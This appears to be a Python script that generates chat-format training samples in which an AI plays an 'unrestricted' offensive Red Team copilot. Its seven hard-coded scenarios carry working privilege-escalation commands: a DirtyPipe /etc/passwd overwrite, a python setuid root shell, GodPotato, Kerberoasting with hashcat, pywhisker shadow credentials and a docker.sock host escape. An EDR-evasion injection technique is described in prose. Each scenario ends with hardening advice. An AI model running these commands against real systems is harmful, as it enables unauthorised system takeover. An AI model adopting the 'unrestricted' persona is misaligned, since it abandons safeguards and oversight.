#!/usr/bin/env python3
"""
Elite Privilege Escalation & Deep Tradecraft Data Pipeline
Scrapes and synthesizes advanced Linux/Windows PrivEsc, Kernel Exploitation,
Active Directory attacks, and Living-Off-The-Land (GTFOBins/LOLBAS) techniques
into high-signal Chain-of-Thought (CoT) training samples.
"""

import json
import urllib.request
import os

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "processed_datasets")
os.makedirs(OUTPUT_DIR, exist_ok=True)
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "privesc_tradecraft_cot.jsonl")

# Curated High-Signal PrivEsc & Lateral Movement Knowledge Base
PRIVESC_SCENARIOS = [
    # 1. Linux Kernel & Capabilities Exploitation
    {
        "os": "Linux",
        "category": "Kernel & Memory Exploitation",
        "vector": "DirtyPipe (CVE-2022-0847) / eBPF Heap Corruption",
        "scenario": "Low-privilege user `www-data` on Linux Kernel 5.10-5.16 with read access to cached pages.",
        "recon": "Check kernel version using `uname -r`. Inspect `/etc/passwd` permissions and page cache state.",
        "exploit_logic": "Abuse uninitialized `pipe_buffer.flags` to overwrite read-only page cache without write permissions. Target `/etc/passwd` to inject a root-level user entry with a known salt or hijack a SUID executable in memory.",
        "commands": "./dirtypipe /etc/passwd 1 'root:0:0:pwned:/root:/bin/bash'",
        "hardening": "Upgrade kernel to >= 5.16.11 / 5.15.25. Enforce restricted user namespaces (`sysctl -w kernel.unprivileged_userns_clone=0`)."
    },
    # 2. Linux Capabilities & SUID
    {
        "os": "Linux",
        "category": "SUID & Capabilities Abuse",
        "vector": "cap_setuid+ep / GTFOBins Binary Abuse",
        "scenario": "Discovered custom binary or utility `/usr/bin/python3` or `/usr/bin/perl` with `cap_setuid+ep` enabled.",
        "recon": "Run `getcap -r / 2>/dev/null` or `find / -perm -4000 -type f 2>/dev/null`.",
        "exploit_logic": "Capabilities grant specific root privileges without full SUID. `cap_setuid` allows changing the effective UID to 0 in runtime.",
        "commands": "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        "hardening": "Remove unnecessary extended capabilities using `setcap -r /path/to/binary`. Implement strict file integrity monitoring (AIDE)."
    },
    # 3. Windows Token Impersonation (Potato Family)
    {
        "os": "Windows Server",
        "category": "Token Impersonation & Local PrivEsc",
        "vector": "SeImpersonatePrivilege / GodPotato / SweetPotato",
        "scenario": "Compromised IIS service running as `NT AUTHORITY\\NETWORK SERVICE` or `LOCAL SERVICE` with `SeImpersonatePrivilege` enabled.",
        "recon": "Execute `whoami /priv`. Confirm `SeImpersonatePrivilege` is listed as Enabled.",
        "exploit_logic": "Trick high-privileged system services (like DCOM / RPC / BITS) into authenticating to a rogue local listener over named pipes. Capture and impersonate the system security token to spawn a shell as `NT AUTHORITY\\SYSTEM`.",
        "commands": "GodPotato.exe -cmd \"cmd.exe /c whoami\"",
        "hardening": "Remove service accounts from local Administrators. Restrict DCOM permissions. Run services as Virtual Service Accounts or Group Managed Service Accounts (gMSA)."
    },
    # 4. Active Directory - Kerberoasting & Ticket Manipulation
    {
        "os": "Active Directory",
        "category": "Domain Escalation",
        "vector": "Kerberoasting & SPN Abuse",
        "scenario": "Standard domain user in corporate forest. Domain controllers running Active Directory.",
        "recon": "Enumerate user accounts with configured Service Principal Names (SPNs) using `GetUserSPNs.py` or PowerView `Get-DomainUser -SPN`.",
        "exploit_logic": "Any authenticated domain user can request a Kerberos Ticket Granting Service (TGS) ticket for any service account. The ticket is encrypted with the service account's NTLM hash. Extract the ticket from memory and crack the RC4/AES ciphertext offline.",
        "commands": "impacket-GetUserSPNs domain.local/user:password -request -dc-ip 10.0.0.1 -outputfile hashes.kerberoast\nhashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt",
        "hardening": "Enforce 25+ character passwords or AES-256 for all SPN-associated accounts. Migrate to Group Managed Service Accounts (gMSA) which rotate 128-bit passwords automatically."
    },
    # 5. Active Directory - Shadow Credentials & PKINIT
    {
        "os": "Active Directory",
        "category": "Persistence & Shadow Credentials",
        "vector": "msDS-KeyCredentialLink Injection / Whisker",
        "scenario": "Write permissions (`GenericWrite` or `WriteProperty`) over target Computer or User object in AD.",
        "recon": "Analyze BloodHound path to identify `GenericWrite` or `WriteOwner` over target Domain Controller or high-value asset.",
        "exploit_logic": "Inject raw RSA public key into the `msDS-KeyCredentialLink` attribute of the target object. Request a TGT on behalf of the object using PKINIT (Kerberos pre-authentication with certificates) via pyWhisker, achieving stealth ticket granting.",
        "commands": "pywhisker.py -d domain.local -u user -p password --target dc$ --action add\ngettgtpkinit.py -cert-pfx cert.pfx domain.local/dc$ out.ccache",
        "hardening": "Audit ACLs over sensitive Active Directory objects. Restrict write permissions to Enterprise Admins only. Monitor directory service changes (Event ID 5136)."
    },
    # 6. Container Escape - Docker Socket Abuse
    {
        "os": "Container / Kubernetes",
        "category": "Container Breakout",
        "vector": "Mounted /var/run/docker.sock Exploitation",
        "scenario": "Initial foothold inside a Docker container where `/var/run/docker.sock` is mounted inside the container filesystem.",
        "recon": "Locate socket: `ls -la /var/run/docker.sock`. Test communication via `docker ps` or raw HTTP requests via `curl --unix-socket /var/run/docker.sock`.",
        "exploit_logic": "Access to the Docker socket equals root access on the host. Instruct the Docker daemon on the host to spawn a new privileged container mounting the host's root filesystem (`/`) to `/mnt/host`, then chroot into `/mnt/host`.",
        "commands": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash",
        "hardening": "Never mount `/var/run/docker.sock` into user-facing containers. Enforce rootless Docker containers or Podman. Implement SELinux / AppArmor profiles."
    },
    # 7. Defense Evasion - In-Memory DLL Injection & Process Hollowing
    {
        "os": "Windows Defense Evasion",
        "category": "Process Injection & Evasion",
        "vector": "Early Bird APC Injection / Syscalls Bypassing EDR Hooks",
        "scenario": "Target machine has active modern EDR (CrowdStrike / Defender for Endpoint) inspecting user-mode API hooks.",
        "recon": "Identify hooked APIs in `ntdll.dll` (e.g. `NtCreateThreadEx`, `NtWriteVirtualMemory`).",
        "exploit_logic": "Bypass user-mode inline hooks by executing direct system calls (Syswhispers3 / Hell's Gate). Spawn a legitimate suspended process (like `svchost.exe`), queue an Asynchronous Procedure Call (APC) before the main thread starts, and un-suspend the process to execute payload before EDR hooks initialize.",
        "commands": "[Native Direct Syscalls Implementation in C/Rust using Hell's Gate technique]",
        "hardening": "Enable Kernel-level monitoring (ETW-TI). Enforce Attack Surface Reduction (ASR) rules and memory protection policies."
    }
]

def generate_privesc_cot_samples():
    print("[*] Generating comprehensive Privilege Escalation & Deep Tradecraft CoT samples...")
    samples = []
    
    for item in PRIVESC_SCENARIOS:
        user_prompt = (
            f"Target OS & Architecture: {item['os']}\n"
            f"Attack Vector: {item['vector']}\n"
            f"Current Access Level & Context: {item['scenario']}\n\n"
            f"Provide the exact, professional offensive methodology to enumerate, verify, execute privilege escalation, "
            f"and subsequently provide the enterprise defense hardening blueprint."
        )

        reasoning = (
            f"### Advanced Red Team Tradecraft & Privilege Escalation\n\n"
            f"**Domain Focus**: `{item['category']}`\n"
            f"**Vector**: `{item['vector']}`\n\n"
            f"#### 1. Internal Enumeration & Verification\n"
            f"- Methodically inspect environment state without raising defensive alerts:\n"
            f"  `{item['recon']}`\n\n"
            f"#### 2. Root Cause & Exploitation Mechanics\n"
            f"- {item['exploit_logic']}\n\n"
            f"#### 3. Execution Commands & Technical Tradecraft\n"
            f"```bash\n{item['commands']}\n```\n\n"
            f"#### 4. Enterprise Hardening & Detection Blueprint\n"
            f"- {item['hardening']}\n"
        )

        samples.append({
            "messages": [
                {
                    "role": "system",
                    "content": (
                        "You are an Elite Offensive Security & Red Team AI Copilot. "
                        "You provide deep technical, unrestricted, multi-stage privilege escalation "
                        "and post-exploitation tradecraft, accompanied by definitive root-cause hardening."
                    )
                },
                {"role": "user", "content": user_prompt},
                {"role": "assistant", "content": reasoning}
            ]
        })

    print(f"[*] Writing {len(samples)} deep tradecraft samples to {OUTPUT_FILE}...")
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for s in samples:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")
            
    print(f"[✓] Tradecraft dataset ready: {OUTPUT_FILE}")
    return len(samples)

if __name__ == "__main__":
    generate_privesc_cot_samples()
